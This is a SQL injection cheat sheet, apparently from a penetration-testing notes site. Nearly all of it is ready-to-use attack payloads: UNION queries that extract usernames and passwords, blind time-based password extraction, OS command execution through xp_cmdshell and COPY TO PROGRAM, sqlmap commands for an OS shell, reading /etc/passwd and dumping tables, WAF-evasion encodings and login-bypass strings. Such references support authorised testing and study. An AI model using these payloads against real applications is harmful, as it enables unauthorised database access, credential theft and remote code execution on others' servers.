---
title: SQL Injection
category: web
description: Detection, manual exploitation, and sqlmap workflows.
tags: [sqli, web, injection]
os: [any]
order: 10
---

## Detection

Append/break and watch for errors, time delay, or content difference:

```text
'   "   \   ')   --   #
1 OR 1=1 --   1' OR '1'='1
1 AND SLEEP(5) --
1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
```

## UNION-based extraction

```sql
-- Find column count
ORDER BY 1,2,3,4-- -    /  UNION SELECT NULL,NULL,NULL-- -

-- Find displayed column
UNION SELECT 1,2,3,4-- -

-- Schema (MySQL)
UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
```

## DB-specific snippets

```sql
-- MSSQL
'; SELECT @@version --
'; EXEC xp_cmdshell 'whoami' --

-- PostgreSQL
'; SELECT version(); --
'; COPY (SELECT '') TO PROGRAM 'id'; --

-- Oracle
' UNION SELECT banner,NULL FROM v$version --

-- SQLite
' UNION SELECT sql,NULL FROM sqlite_master --
```

## Blind / time-based

```sql
-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(3),0)-- -
-- MSSQL
'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))=97) WAITFOR DELAY '0:0:3'--
-- Postgres
'; SELECT CASE WHEN (substr((SELECT passwd FROM users LIMIT 1),1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

## sqlmap one-liners

```bash
sqlmap -u "http://{{RHOST}}/item?id=1" --batch --dbs --random-agent
sqlmap -r req.txt --batch --level 5 --risk 3 --tamper=space2comment
sqlmap -u "http://{{RHOST}}/" --data="user=a&pass=b" -p user --dbs
sqlmap -u "..." --os-shell                    # RCE if file-write & web-writable dir
sqlmap -u "..." --file-read=/etc/passwd
sqlmap -u "..." -D appdb -T users --dump
```

## Common WAF bypasses

```text
SeLeCt    /*!50000SELECT*/    %20→%09 or +    UNION%0aSELECT
char(83,69,76,69,67,84)       0x53454c454354
```

## Auth bypass quickies

```text
' OR 1=1 -- -
admin' --
admin') /*
" OR ""="
```
